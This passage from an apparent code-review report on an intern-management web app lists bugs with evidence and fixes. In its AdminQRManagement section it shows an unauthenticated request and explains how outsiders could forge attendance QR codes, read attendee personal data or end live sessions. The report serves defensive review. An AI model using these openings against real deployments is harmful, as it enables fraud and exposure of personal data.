**Failure:** An intern books a seat on a slow connection and immediately clicks Cancel in the bookings table before the POST returns. They confirm the window.confirm, then get "Failed to cancel booking: Server error while cancelling booking", and the booking that was actually created remains active.

**Evidence:**
```
useSeatManagement.jsx:537 `setDailyBookings((prev) => ({ ...prev, [seatToBook]: { dummy: true } }));`; useSeatManagement.jsx:572-581 `const booking = dailyBookings[seatNumber]; if (!booking) return; ... await cancelBooking(booking.id);`; backend/controllers/seatBookingController.js:239 `SeatBooking.findById(bookingId)`.
```

**Fix:** Guard with `if (!booking?.id) return;` (or disable the cancel control while `booking.dummy` is set), and validate the id server-side with `mongoose.isValidObjectId` before findById.

# AdminAnnouncements — 6 findings

## [MEDIUM] Page only checks for a token, not the announcements.manage permission — supervisors get a fully broken page
`frontend/src/pages/AdminAnnouncements.jsx:136` · *permissions*

**What's wrong:** The mount effect (lines 136-143) only verifies adminInfo.token exists; it never calls hasAdminPermission("announcements.manage"). The route (AppRoutes.jsx:166) is wrapped only in AdminRoute, which checks session.token and session.user.role (AdminRoute.jsx:7). The backend, however, requires "announcements.manage" for every /announcements path (adminAuth.js:32 + enforceRoutePermission at adminRoutes.js:90), and the supervisor role does not have it (adminPermissions.js:12-15 grants only dashboard.view, interns.view, daily_logs.view, attendance.view, leave.view). The megaphone shortcut that navigates here (AdminNavbar.jsx:34-40 mobile, :73-79 desktop) is rendered for every admin user with no permission filter, unlike the sidebar links which are filtered at AdminNavigation.jsx:59.

**Failure:** A supervisor clicks the megaphone icon in the top bar. The page renders the full compose form; the list fetch returns 403 so the panel shows the red banner "Failed to load announcements." together with "No announcements yet — Compose and send your first announcement." The supervisor writes an urgent notice, clicks "Send to All Interns", and gets "Failed to create announcement: 403" — after composing the whole message. Every control on the page is dead for that role.

**Evidence:**
```
AdminAnnouncements.jsx:137-141 `const adminInfo = JSON.parse(...); if (!adminInfo.token) navigate("/admin-login")` — no permission check. adminAuth.js:32 `if (path.startsWith("/announcements")) return "announcements.manage";`. adminPermissions.js:12-15 supervisor list omits announcements.manage.
```

**Fix:** Gate the megaphone button in AdminNavbar.jsx with hasAdminPermission("announcements.manage"), and in AdminAnnouncements.jsx redirect (or render a "no access" state) when hasAdminPermission("announcements.manage") is false, the same way navLinks are filtered in AdminNavigation.jsx:59.

## [MEDIUM] Delete confirmation button is never disabled — double-click fires two DELETEs and shows a false error toast
`frontend/src/pages/AdminAnnouncements.jsx:698` · *race-condition*

**What's wrong:** The modal's Delete button (lines 698-703) has no `disabled` attribute and no spinner; it calls handleDelete(confirmDelete) directly. handleDelete (lines 183-200) sets deletingId (which only affects the row button behind the modal, line 574) and clears confirmDelete in the finally block, so the button stays live and clickable for the whole round trip. Two clicks send two DELETE /admin/announcements/:id requests for the same id.

**Failure:** Admin double-clicks "Delete" in the confirmation dialog. The first request succeeds (200) and the row is removed; the second finds nothing and AnnouncementController.deleteAnnouncement:68-70 returns 404, so announcementApi.delete throws and the catch at line 194 fires showToast("Failed to delete announcement.", "error"). The admin sees a red "Failed to delete announcement." toast even though the announcement was in fact deleted, and may re-try or assume the record is still live.

**Evidence:**
```
AdminAnnouncements.jsx:698-703 — `<button onClick={() => handleDelete(confirmDelete)} className="...">Delete</button>` with no disabled/deletingId guard; contrast the list row at :572-575 which does pass `disabled={deletingId === a._id}`.
```

**Fix:** Add `disabled={deletingId === confirmDelete}` and a spinner label to the modal's Delete button (and to Cancel), or early-return from handleDelete when deletingId is already set.

## [MEDIUM] Fetch failure renders the "No announcements yet" empty state, implying the data was lost
`frontend/src/pages/AdminAnnouncements.jsx:493` · *error-handling*

**What's wrong:** fetchAnnouncements (lines 121-134) sets an error string on failure but leaves `announcements` at its previous value (`[]` on first load) and always clears loadingList. The render branch at line 493 then evaluates `filtered.length === 0` and shows the success-shaped empty state, with no retry affordance anywhere on the page.

**Failure:** A 500 from GET /api/admin/announcements (or a supervisor's 403, or a dropped connection) makes the panel display a megaphone illustration, "No announcements yet" and "Compose and send your first announcement.", plus the counter chip "0 total" at line 478. An admin reasonably concludes every announcement has been deleted from the system and re-sends them, creating duplicates. The only clue is a dismissible banner in a different part of the page.

**Evidence:**
```
AdminAnnouncements.jsx:129-131 `catch (err) { setError("Failed to load announcements."); }` — no `setAnnouncements`/failure flag; lines 493-506 branch purely on `filtered.length === 0`.
```

**Fix:** Track a `loadFailed` state and render a distinct "Couldn't load announcements — Retry" panel (wired to fetchAnnouncements) instead of the empty state when the fetch threw.

## [LOW] Error banner is never cleared on a subsequent successful load
`frontend/src/pages/AdminAnnouncements.jsx:121` · *react-state*

**What's wrong:** fetchAnnouncements sets `error` in its catch (line 130) but the success path (lines 124-128) never calls setError(null), and the only other reset is the user clicking the × at line 284. The same function is re-invoked after every successful send (line 174).

**Failure:** The initial load fails on a network blip and the red "Failed to load announcements." banner appears. The admin sends a new announcement; the create succeeds, the refetch succeeds and the full list renders — yet the stale red failure banner is still sitting above it, suggesting the page is broken when it is not.

**Evidence:**
```
AdminAnnouncements.jsx:121-134 — `setLoadingList(true)` at the top, but no `setError(null)` anywhere in the try block.
```

**Fix:** Call setError(null) at the start of fetchAnnouncements (next to setLoadingList(true)).

## [LOW] Toast timers are never tracked or cleared — a stale timer dismisses a newer toast and fires setState after unmount
`frontend/src/pages/AdminAnnouncements.jsx:115` · *react-effect-cleanup*

**What's wrong:** showToast schedules `setTimeout(() => setToast(null), 4000)` (lines 116-117) without storing the handle, so overlapping calls leave multiple live timers, each of which unconditionally nulls whatever toast is current. There is also no unmount cleanup. The identical pattern exists in AdminFeatureTips.jsx:102-105.

**Failure:** Admin sends an announcement at t=0 ("Announcement sent successfully!"). At t=3s they delete another one; the new "Announcement deleted." toast appears. At t=4s the first timer fires and clears it after only 1 second on screen, so the delete confirmation is easy to miss. If the admin navigates away within 4s of any action, the timer calls setToast on an unmounted component.

**Evidence:**
```
AdminAnnouncements.jsx:115-118 `const showToast = (msg, type = "info") => { setToast({ message: msg, type }); setTimeout(() => setToast(null), 4000); };` — return value discarded, no clearTimeout.
```

**Fix:** Keep the timer id in a useRef, clearTimeout(ref.current) before scheduling a new one, and clear it in a useEffect cleanup on unmount.

## [LOW] JSON.parse of localStorage adminInfo without try/catch white-screens the page
`frontend/src/pages/AdminAnnouncements.jsx:137` · *crash*

**What's wrong:** The mount effect parses the raw localStorage value with no error handling. The identical unguarded parse exists at AdminFeatureTips.jsx:121 and inside the shared helper getAuthToken (api/adminApi.js:25-29), which runs on every request these pages make. The codebase already has a safe accessor — getAdminSession() in utils/adminAuth.js:1-4 wraps the same parse in try/catch — but neither page uses it.

**Failure:** If the adminInfo entry is truncated or corrupted (interrupted write, a quota error, or manual tampering), JSON.parse throws a SyntaxError inside the effect. With no error boundary in AppRoutes.jsx the whole admin app unmounts to a blank white screen, and because the throw happens before the navigate("/admin-login") on line 139 the user is not even redirected to re-login — they are stuck until they clear site data manually.

**Evidence:**
```
AdminAnnouncements.jsx:137 `const adminInfo = JSON.parse(localStorage.getItem("adminInfo") || "{}");` — no try/catch, unlike utils/adminAuth.js:2-3 which does `try { return JSON.parse(...) } catch { return null; }`.
```

**Fix:** Replace the inline parse in both pages with getAdminSession() from utils/adminAuth.js, and wrap the parse in adminApi.js:getAuthToken in a try/catch that returns null.

# AdminFeatureTips — 9 findings

## [CRITICAL] Entire Feature Tips admin page is dead — no /api/admin/feature-tips route exists on the backend
`backend/routes/adminRoutes.js:172` · *api-contract-mismatch*

**What's wrong:** AdminFeatureTips.jsx calls four endpoints through featureTipAdminApi (adminApi.js:976 GET /admin/feature-tips, :986 POST /admin/feature-tips, :1002 PATCH /admin/feature-tips/:id/toggle, :1012 DELETE /admin/feature-tips/:id). None of them are registered. adminRoutes.js (mounted at /api/admin in app.js:70) registers announcements at lines 170-172 but never imports or mounts anything from featureTipController; adminSeatRoutes.js (also mounted at /api/admin, app.js:75) has nothing either. A repo-wide grep for "feature-tips" in backend/ returns only comments in featureTipController.js/FeatureTip.js and the intern router. getAllFeatureTips / createFeatureTip / toggleFeatureTip / deleteFeatureTip are exported from featureTipController.js:143-152 and never required by any router. Every request therefore falls through adminRoutes (router.use(authMiddleware/requireAdmin/enforceRoutePermission) still runs, then no path matches) and hits Express's default 404.

**Failure:** An admin opens /admin/feature-tips. fetchTips() (AdminFeatureTips.jsx:111) gets a 404, featureTipAdminApi.getAll throws "Failed to fetch feature tips: 404", the red banner "Failed to load feature tips." appears and the list renders "No feature tips found." forever. Filling in the form and pressing "Publish Tip" (line 396) also 404s and shows "Failed to create feature tip: 404". No feature tip can ever be created, toggled, or deleted — the page is 100% non-functional.

**Evidence:**
```
backend/routes/adminRoutes.js:169-172 → only `/announcements` GET/POST/DELETE are declared; no feature-tip routes anywhere in the file. backend/controllers/featureTipController.js:143-148 exports getAllFeatureTips/createFeatureTip/toggleFeatureTip/deleteFeatureTip, which no route file imports (featureTipRoutes.js:5-8 imports only the two intern handlers).
```

**Fix:** Import the four admin handlers in adminRoutes.js and register them next to the announcement routes, e.g. router.get("/feature-tips", requirePermission("announcements.manage"), getAllFeatureTips); router.post("/feature-tips", requirePermission("announcements.manage"), createFeatureTip); router.patch("/feature-tips/:id/toggle", ...); router.delete("/feature-tips/:id", ...). Note that without an explicit requirePermission, routePermission() in adminAuth.js:27-39 has no branch for /feature-tips and would fall through to the default "dashboard.view", letting a supervisor publish modals to every intern.

## [HIGH] featureTipRoutes.js is never mounted in app.js — intern-side tip delivery 404s
`backend/app.js:76` · *api-contract-mismatch*

**What's wrong:** backend/routes/featureTipRoutes.js defines GET /unseen and POST /mark-seen, but app.js never requires it and never calls app.use("/api/feature-tips", featureTipRoutes). The require list (app.js:7-26) and every app.use() call (app.js:61-85) omit it. FeatureTipModal.jsx:15 calls api.get("/feature-tips/unseen") and :36 api.post("/feature-tips/mark-seen"), which resolve to ${VITE_BACKEND_URL}/feature-tips/unseen = /api/feature-tips/unseen — an unmounted path.

**Failure:** Even after the admin CRUD routes from the previous finding are added and an admin publishes a tip, no intern ever sees it: FeatureTipModal's fetch 404s, the catch at FeatureTipModal.jsx:20 swallows it into console.error, and the What's-New modal silently never opens. The admin sees the tip listed as "Active" in AdminFeatureTips while it is delivered to zero users.

**Evidence:**
```
backend/app.js:7-26 (requires) and :61-85 (mounts) contain no featureTipRoutes entry; grep for "featureTipRoutes" across backend/ matches only routes/featureTipRoutes.js:1 (its own header comment).
```

**Fix:** Add `const featureTipRoutes = require("./routes/featureTipRoutes");` and `app.use("/api/feature-tips", featureTipRoutes);` alongside the other mounts in app.js.

## [MEDIUM] AdminFeatureTips has no navigation entry — reachable only by typing the URL
`frontend/src/components/AdminNavigation.jsx:45` · *dead-ui*

**What's wrong:** The navLinks array (AdminNavigation.jsx:45-58) lists 12 admin destinations; /admin/feature-tips is not among them, and no other component links to it — a grep for "feature-tips" across frontend/src returns only adminApi.js fetch URLs, AppRoutes.jsx:167 (the route declaration) and FeatureTipModal.jsx's intern endpoints. AdminNavigation.jsx:16 even imports the `Lightbulb` icon that AdminFeatureTips.jsx:4 uses for its header, but no nav entry consumes it, so the icon import is dead.

**Failure:** An admin who wants to publish a "What's New" tip has no way to reach the page: the sidebar has no Feature Tips button and the top bar's only shortcut (AdminNavbar.jsx:73) goes to /admin/announcements. The feature is invisible unless someone manually types /admin/feature-tips.

**Evidence:**
```
frontend/src/components/AdminNavigation.jsx:45-59 — navLinks has entries for dashboard, daily-records, intern-attendance, face-attendance, qr-management, pin-management, leave-requests, study-leave-requests, intern-locations, seat-management, inactive-interns, logbook-restrictions; nothing for /admin/feature-tips. Unused `Lightbulb` import at line 16.
```

**Fix:** Add `{ to: "/admin/feature-tips", label: "Feature Tips", icon: <Lightbulb className="h-[18px] w-[18px]" />, permission: "announcements.manage" }` to navLinks.

## [MEDIUM] Delete confirmation button is never disabled — double-click fires two DELETEs and shows a false error toast
`frontend/src/pages/AdminFeatureTips.jsx:546` · *race-condition*

**What's wrong:** Same defect as the announcements modal: the confirm dialog's Delete button (line 546) has no `disabled` guard and no in-flight indicator, while handleDelete (lines 184-196) keeps confirmDelete truthy until its finally block. Nothing prevents two concurrent DELETE /admin/feature-tips/:id calls for the same id.

**Failure:** Admin double-clicks "Delete". The first call succeeds; the second hits deleteFeatureTip (featureTipController.js:81-83) which returns 404 "Feature tip not found.", featureTipAdminApi.delete throws, and the catch at AdminFeatureTips.jsx:190 shows "Failed to delete feature tip." — a red error toast for an operation that actually succeeded.

**Evidence:**
```
AdminFeatureTips.jsx:546 `<button onClick={() => handleDelete(confirmDelete)} className="flex-1 px-4 py-2 bg-red-500 ...">Delete</button>` — no disabled prop; deletingId (line 97) is only read at line 509 for the row icon, which is hidden behind the modal.
```

**Fix:** Add `disabled={deletingId === confirmDelete}` to the modal Delete button and render a spinner while the request is in flight.

## [MEDIUM] Toggle-active button is not disabled while the PATCH is in flight — double-click silently reverts the tip
`frontend/src/pages/AdminFeatureTips.jsx:502` · *race-condition*

**What's wrong:** The toggle button at line 502 renders a spinner when togglingId === t._id but never sets `disabled`, and handleToggle (lines 165-181) has no re-entrancy guard. Because the backend toggle is a flip rather than an idempotent set (featureTipController.js:66 `tip.isActive = !tip.isActive;`), two requests cancel each other out.

**Failure:** Admin clicks the toggle twice quickly to deactivate a tip. Two PATCH /admin/feature-tips/:id/toggle requests run; the server flips isActive true→false→true, so the tip stays ACTIVE and keeps being shown to interns. The UI applies whichever response lands last and showToast at line 172-175 announces a state based on that single response, so the admin can be told "Tip deactivated" while the tip remains active in the database (or vice versa).

**Evidence:**
```
AdminFeatureTips.jsx:502 `<button onClick={() => handleToggle(t._id)} className="p-2 text-gray-400 hover:text-blue-500" title="Toggle Active">` — no disabled attribute. featureTipController.js:66 performs a non-idempotent flip.
```

**Fix:** Add `disabled={togglingId === t._id}` to the button and/or guard handleToggle with `if (togglingId) return;`. Better: change the endpoint to PATCH { isActive: boolean } so repeated calls are idempotent.

## [MEDIUM] Fetch failure renders "No feature tips found." instead of a load-error state
`frontend/src/pages/AdminFeatureTips.jsx:458` · *error-handling*

**What's wrong:** fetchTips (lines 108-118) catches the error into a banner but leaves `tips` as `[]`, so the render at line 458-461 shows the neutral "No feature tips found." message. There is no retry button. Combined with the missing backend routes, this is the state the page is permanently stuck in.

**Failure:** GET /admin/feature-tips fails (today: always, with 404). The list card renders "No feature tips found." — indistinguishable from a genuinely empty collection — so an admin creates a duplicate tip rather than realising the request failed. If the create also fails they are left with no accurate picture of what exists.

**Evidence:**
```
AdminFeatureTips.jsx:113-115 `catch (err) { setError("Failed to load feature tips."); }` with `tips` untouched; lines 458-461 `: filtered.length === 0 ? (<div ...>No feature tips found.</div>)`.
```

**Fix:** Add a `loadFailed` flag set in the catch and render an explicit error + Retry panel in the list card when it is true.

## [MEDIUM] Delete-confirmation modal uses z-40 and renders beneath the admin sidebar and top bar
`frontend/src/pages/AdminFeatureTips.jsx:540` · *ui-layering*

**What's wrong:** The confirm dialog overlay is `fixed inset-0 z-40`, but the page is rendered inside AdminNavigation whose sidebar is `fixed ... z-[9995]` (AdminNavigation.jsx:101-104), whose mobile menu scrim is `z-[9990]` (line 94), and whose mobile top bar is `z-[9999]` (AdminNavbar.jsx:23) with the desktop bar at `z-[9990]` (AdminNavbar.jsx:64). The sibling page uses `z-[9999]` for the same dialog (AdminAnnouncements.jsx:667), so the value here is simply wrong.

**Failure:** On a phone, an admin taps Delete on a tip: the dark backdrop covers the content area but the blue TalentHub header bar stays fully lit on top of it and remains clickable — the admin can tap the hamburger or the megaphone icon and navigate away while the modal is still mounted, leaving confirmDelete set. On desktop the 270px sidebar likewise paints over the backdrop and its nav links stay clickable, so the "modal" is not modal.

**Evidence:**
```
AdminFeatureTips.jsx:540 `className="fixed inset-0 z-40 flex items-center justify-center bg-black/30 backdrop-blur-sm p-4"` vs AdminNavigation.jsx:101 `z-[9995]`, AdminNavbar.jsx:23 `z-[9999]`, and AdminAnnouncements.jsx:667 `z-[9999]`.
```

**Fix:** Raise the overlay to z-[9999] to match AdminAnnouncements.jsx:667.

## [LOW] Error banner is never cleared on a subsequent successful load
`frontend/src/pages/AdminFeatureTips.jsx:108` · *react-state*

**What's wrong:** fetchTips sets `error` in its catch (line 114) and never resets it on success (lines 111-112); the only reset is the manual × at line 294. fetchTips is re-run after every successful create (line 156).

**Failure:** A transient failure paints "Failed to load feature tips."; the admin then publishes a tip successfully and the list refreshes correctly, but the red failure banner remains on screen indefinitely, contradicting the success toast shown at the same moment.

**Evidence:**
```
AdminFeatureTips.jsx:108-118 — try block calls only featureTipAdminApi.getAll() and setTips(data); no setError(null).
```

**Fix:** Add setError(null) alongside setLoadingList(true) at the top of fetchTips.

## [LOW] Emoji field maxLength={2} counts UTF-16 units and mangles multi-codepoint emoji
`frontend/src/pages/AdminFeatureTips.jsx:372` · *input-validation*

**What's wrong:** The emoji input is limited to 2 characters, but HTML maxLength counts UTF-16 code units, not grapheme clusters. Emoji outside the BMP occupy 2 units for a single glyph, and sequences occupy far more: a flag such as 🇱🇰 is 4 units, a ZWJ sequence such as 👨‍💻 is 5, and any emoji followed by a variation selector is 3.

**Failure:** An admin creating a tip for the Sri Lankan holiday calendar pastes 🇱🇰 into the Emoji box. The browser truncates to the first 2 units, storing the lone regional-indicator "🇱", which renders as an empty box or a boxed letter L in the coloured avatar circle at AdminFeatureTips.jsx:471-476 and in the intern-facing modal. Pasting 👨‍💻 stores only 👨.

**Evidence:**
```
AdminFeatureTips.jsx:367-373 `<input type="text" value={emoji} onChange={...} maxLength={2} />`; the placeholder in the sibling Title field (line 330) even suggests emoji usage.
```

**Fix:** Drop maxLength and clamp in onChange with a grapheme-aware slice, e.g. `setEmoji([...new Intl.Segmenter().segment(e.target.value)].slice(0,1).map(s=>s.segment).join(""))`, or simply raise maxLength to 8.

# AdminInternCertificate — 6 findings

## [MEDIUM] Certificate PDF never excludes approved extended leave — the backend data is fetched but never passed through
`frontend/src/pages/AdminInternCertificate.jsx:185` · *api-contract*

**What's wrong:** `getCertificateData` queries approved `study_leave` requests and returns them as `certificateData.extendedLeaves` (certificateController.js:66-99). `generateCertificatePDF` implements a whole block that turns them into an " [excluding N days of approved extended leave]" clause (generateCertificatePDF.js:188-203). But `handleGeneratePDF` never forwards the field, so the generator's default `extendedLeaves = []` always applies and the clause is dead code.

**Failure:** An intern took 21 days of approved study leave during a 6-month internship. The admin downloads the official certificate; the paragraph reads "during the period 1 January 2026 to 30 June 2026 (6 months)" with no leave exclusion, overstating the trained period on a document issued to a university. The database and the PDF generator both had the data needed to say otherwise.

**Evidence:**
```
certificateController.js:99 `extendedLeaves: extendedLeaves || [],`; AdminInternCertificate.jsx:185-195 the `generateCertificatePDF({ intern, startDate, endDate, attendanceCount, projects, specialization, logoBase64, gitCommitsData, verificationUrl })` call omits `extendedLeaves`; generateCertificatePDF.js:52 `extendedLeaves = []` default and :189 `if (extendedLeaves && extendedLeaves.length > 0)`.
```

**Fix:** Destructure `extendedLeaves` from `certData` at AdminInternCertificate.jsx:172 and pass `extendedLeaves: extendedLeaves || []` into the `generateCertificatePDF` call.

## [MEDIUM] TalentTrail attendance count is unreachable because `??` does not fall back on 0
`frontend/src/pages/AdminInternCertificate.jsx:174` · *logic*

**What's wrong:** Both the preview (line 232) and the PDF (line 174) compute `localMeetingPresent ?? certData.attendanceCount ?? 0`. The effect at lines 133-150 always calls `setLocalMeetingPresent(presentCount)` whenever `attData.meetingAttendance` is an array — and `getAdminInternAttendance` always returns that key as an array (adminInternDetailsController.js:333). So `localMeetingPresent` is always a number, including `0`, and `??` (nullish, not falsy) never falls through. The documented TalentTrail fallback is dead, and the `attData?.stats?.present` branch on line 148 is unreachable.

**Failure:** An intern whose meeting attendance lives only in TalentTrail (local `intern.attendance` empty and the TalentTrail enrichment inside `getAdminInternAttendance` fails or returns nothing) has `certData.attendanceCount = 20` from `getCertificateData`. Because `localMeetingPresent` is 0, the preview shows "0 meetings (0%)" and the issued PDF states "attending 0 meetings (achieving an attendance rate of 0%)" on a certificate handed to the intern's university.

**Evidence:**
```
AdminInternCertificate.jsx:133-150 `if (attData.meetingAttendance && Array.isArray(attData.meetingAttendance)) { ... presentCount = weeks.size; } else { presentCount = attData?.stats?.present ?? 0; } setLocalMeetingPresent(presentCount);`; :174 and :232 `localMeetingPresent ?? certData.attendanceCount ?? 0`. adminInternDetailsController.js:330-337 always returns `meetingAttendance` (an array) and `stats`.
```

**Fix:** Only set `localMeetingPresent` when `presentCount > 0`, or change the selection to `const effective = (localMeetingPresent || certData.attendanceCount || 0)` so a zero local count defers to the TalentTrail figure.

## [MEDIUM] Verification page serves a stale snapshot because issueCertificate reuses the first record forever
`backend/controllers/certificateController.js:140` · *data-integrity*

**What's wrong:** `issueCertificate` reuses any existing `CertificateRecord` with `isValid: true` for the intern, refreshing only `issuedAt`. Every other field (traineeName, institute, fieldOfSpecialization, trainingStartDate, trainingEndDate) keeps the values captured at first issue. Meanwhile the PDF is rendered from live `getCertificateData`, which prefers TalentTrail values (`ttIntern?.name`, `ttIntern?.trainingEndDate`) over the local ones the record stored.

**Failure:** An admin downloads a certificate in June; a record is created with `trainingEndDate = 2026-06-30` and `traineeName` from the local Intern doc. The internship is extended and TalentTrail is corrected to 2026-08-30. The admin re-downloads in August: the PDF paragraph says "1 January 2026 to 30 August 2026", but scanning the QR on that same PDF opens /verify/certificate/<token> and the verification API reports trainingEndDate 2026-06-30 (and possibly a different spelling of the name). The verification page appears to contradict the certificate it is verifying.

**Evidence:**
```
certificateController.js:140-150 `let existingRecord = await CertificateRecord.findOne({ internId, isValid: true }); if (existingRecord) { token = existingRecord.verificationToken; existingRecord.issuedAt = new Date(); await existingRecord.save(); }` — no field refresh. certificateController.js:75-90 the PDF payload prefers `ttIntern?.name` / `ttIntern?.trainingEndDate`. certificateController.js:195-206 `verifyCertificate` returns the stored snapshot.
```

**Fix:** On reuse, overwrite the record's snapshot fields with the same merged values the PDF is built from before saving (or accept the merged intern object as a request body and persist it), so the verification payload and the printed certificate always agree.

## [MEDIUM] Clicking the header logo wipes all of localStorage, not just the admin session
`frontend/src/pages/AdminInternCertificate.jsx:251` · *data-loss*

**What's wrong:** The branding block is rendered with `cursor-pointer` and a hover/tap scale animation, and its `onClick` runs `localStorage.clear(); navigate('/admin-login');`. `localStorage.clear()` removes every key for the origin — `adminInfo`, `userData`, and any other cached preference — whereas the adjacent Logout button on line 260 correctly removes only `adminInfo`.

**Failure:** An admin viewing a certificate clicks the SLT logo expecting to return to the dashboard (that is what a logo normally does, and the element is styled as clickable). They are instead logged out, and on a shared workstation the intern's `userData` session and every other cached value in localStorage are destroyed too, forcing that user to re-authenticate as well.

**Evidence:**
```
AdminInternCertificate.jsx:250-252 `<motion.div className="flex items-center space-x-3 cursor-pointer" onClick={() => { localStorage.clear(); navigate('/admin-login'); }} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}>` versus :260 `onClick={() => { localStorage.removeItem('adminInfo'); navigate('/admin-login'); }}`.
```

**Fix:** Change the logo handler to `navigate('/admin/dashboard')`, and if a logout is genuinely intended there, use `localStorage.removeItem('adminInfo')` to match the Logout button.

## [LOW] handleAddCustomProject mutates the existing certData arrays in place
`frontend/src/pages/AdminInternCertificate.jsx:78` · *data-integrity*

**What's wrong:** `const updatedCertData = { ...certData }` is a shallow copy, so `updatedCertData.projects` and `updatedCertData.gitCommitsData.projectCommits` are the same array instances held by the current state. Both are then mutated with `.push(...)` before `setCertData`. The re-render happens only because the top-level object identity changed; the underlying arrays are shared with the previous state snapshot.

**Failure:** Adding a custom project pushes into the same array the previous state object references, so any future memoisation on `certData.projects` (or React StrictMode's double-invocation of the handler in development) appends the project twice — the preview then lists "Payroll Module" twice and the generated PDF sentence reads "...contributed to the following projects: Payroll Module, and Payroll Module."

**Evidence:**
```
AdminInternCertificate.jsx:71-90 `const updatedCertData = { ...certData }; if (!updatedCertData.projects) updatedCertData.projects = []; ... updatedCertData.gitCommitsData.projectCommits.push({...}); updatedCertData.projects.push({...}); setCertData(updatedCertData);`.
```

**Fix:** Use a functional update with fresh arrays: `setCertData(prev => ({ ...prev, projects: [...(prev.projects || []), newRow], gitCommitsData: newProject.commits ? { ...prev.gitCommitsData, projectCommits: [...(prev.gitCommitsData?.projectCommits || []), commitRow] } : prev.gitCommitsData }))`.

## [LOW] Commit badges use exact string matching in the preview but case-insensitive trimmed matching in the PDF
`frontend/src/pages/AdminInternCertificate.jsx:397` · *consistency*

**What's wrong:** The preview looks up commit counts with `gc.projectName === (p.projectName || p.name)` — a strict, whitespace- and case-sensitive comparison — while `generateCertificatePDF` matches with `gc.projectName?.trim().toLowerCase() === (p.projectName || p.name)?.trim().toLowerCase()`. The two paths therefore disagree whenever the TalentTrail project name differs from the assignment name in case or surrounding whitespace.

**Failure:** TalentTrail returns commits for repo "TalentHub " (trailing space) while the project assignment is "TalentHub". The on-screen preview shows the project with no commits badge, so the admin believes no commit data exists — but the downloaded PDF says "contributing 214 code commits". The document does not match the approval screen.

**Evidence:**
```
AdminInternCertificate.jsx:396-402 `const match = gitCommitsData.projectCommits.find((gc) => gc.projectName === (p.projectName || p.name));` versus generateCertificatePDF.js:228-232 `const match = gitCommitsData.projectCommits.find((gc) => gc.projectName?.trim().toLowerCase() === (p.projectName || p.name)?.trim().toLowerCase());`.
```

**Fix:** Extract a single `findCommits(gitCommitsData, project)` helper using the trimmed/lower-cased comparison and call it from both the preview and the PDF generator.

# AdminQRManagement — 6 findings

## [CRITICAL] QR generate / session-status / expire endpoints have no authentication middleware
`backend/routes/qrCodeRoutes.js:13` · *authorization*

**What's wrong:** `GET /api/qrcode/generate-qrcode`, `GET /api/qrcode/session/:sessionId`, `POST /api/qrcode/session/:sessionId/expire` and `POST /api/qrcode/mark-attendance` are registered with no middleware at all, while the scan routes on lines 15-16 correctly use `authenticateUser`. The mount prefix is `/api/qrcode` (app.js:64), so these are fully public. AdminQRManagement sends an Authorization header via `getHeaders()`, but the server ignores it.

**Failure:** An unauthenticated visitor calls `GET /api/qrcode/generate-qrcode?type=meeting&projectName=General%20Meeting` and receives a valid, scannable meeting QR plus its sessionId — they can then project their own QR and have interns mark attendance. Polling `GET /api/qrcode/session/<id>` returns every attendee's `internId`, `traineeId`, `traineeName`, stack and attendance rates (PII) with no login. `POST /api/qrcode/session/<id>/expire` lets anyone kill a live meeting session mid-presentation.

**Evidence:**
```
qrCodeRoutes.js:13 `router.get("/generate-qrcode", generateQRCode);`, :14 `router.post("/mark-attendance", markAttendance);`, :17 `router.get("/session/:sessionId", getSessionStatus);`, :18 `router.post("/session/:sessionId/expire", expireSession);` — compare :15 `router.post("/scan", authenticateUser, scanQRCode);`. qrCodeController.js:219-245 returns full attendee PII from `getSessionStatus`.
```

**Fix:** Apply `authenticateUser, requireAdmin, requirePermission('attendance.manage')` to `/generate-qrcode`, `/session/:sessionId` and `/session/:sessionId/expire`, and delete or authenticate `/mark-attendance` (it currently marks attendance for an arbitrary `internId` from the body with no auth).

## [HIGH] Live attendee panel shows everyone who attended the same meeting name earlier today, not this session's scanners
`backend/controllers/qrCodeController.js:194` · *logic*

**What's wrong:** `getSessionStatus` ignores the session identity when it queries the database. It matches any intern with a meeting attendance entry whose `meetingName`/`projectName` equals `session.projectName` and whose `date` falls anywhere inside today (`todayStart`..`todayEnd`), then overwrites the in-memory attendee list with that result. Sessions created later the same day inherit all earlier attendees for the same meeting name.

**Failure:** A 10:00 AM "General Meeting" is run and 15 interns scan. At 2:00 PM the admin generates a fresh QR for another "General Meeting" with "Limit Attendance Count" set to 10. Within 2 seconds the first poll pulls in the 15 morning attendees, the fullscreen board shows "Total Scans 15 / Remaining Slots 0", and line 260 flips the brand-new session to `status: "Ended"` — the QR is dead before anyone in the room can scan it, and the overlay reads "Session Ended".

**Evidence:**
```
qrCodeController.js:185-217 builds `todayStart`/`todayEnd` and queries `Intern.find({$or:[{attendance:{$elemMatch:{... meetingName: projectNameRegex, date: {$gte: todayStart, $lte: todayEnd}}}}, ...]})` with no session/time-of-creation constraint; :257 `session.attendees = Array.from(mergedMap.values());` replaces the list; :260 `if (session.limit !== null && session.attendees.length >= session.limit && session.status === "Active") session.status = "Ended";`.
```

**Fix:** Constrain the DB query to entries created at or after the session's creation time (store `createdAt = Date.now()` in the session object and use `date: { $gte: new Date(session.createdAt) }`), or store the `sessionId` on each attendance entry and match on that instead of on meeting name + day.

## [HIGH] Daily-attendance QR session reuses the "General Meeting" default and lists meeting attendees on the daily board
`backend/controllers/qrCodeController.js:119` · *api-contract*

**What's wrong:** For the Daily tab the page sends `projName = ''` (AdminQRManagement.jsx:33) and adminApi omits the parameter entirely, so `generateQRCode` falls back to `normalizeProjectName(projectName || meetingTitle || "General Meeting")` and stores `projectName: "General Meeting"` on the daily session. `getSessionStatus` then runs its meeting-attendance DB query unconditionally — it never checks `session.type` — using that name.

**Failure:** Admin switches to the Daily tab, generates the daily check-in QR and clicks "Present Now". The live panel immediately fills with the names of every intern who marked *meeting* attendance for "General Meeting" today, even though none of them scanned the daily code, and interns who do scan the daily code are indistinguishable from them. "Total Scans" is therefore wrong for every daily session.

**Evidence:**
```
AdminQRManagement.jsx:33 `const projName = activeTab === 'meeting' ? meetingName : '';`; adminApi.js:386 only appends `projectName` when `type === "meeting"`; qrCodeController.js:119 default `"General Meeting"`; :152-161 stores it on the daily session; :184-217 runs the meeting query with no `session.type` guard.
```

**Fix:** In `getSessionStatus`, skip the meeting-attendance DB query when `session.type === 'daily'` and query `DailyRecord`/`FaceAttendanceLog` for today's daily check-ins instead; also stop defaulting `projectName` to "General Meeting" for daily sessions.

## [MEDIUM] Session-status polling errors are swallowed, so the board shows "Active" with zero attendees indefinitely
`frontend/src/pages/AdminQRManagement.jsx:94` · *error-handling*

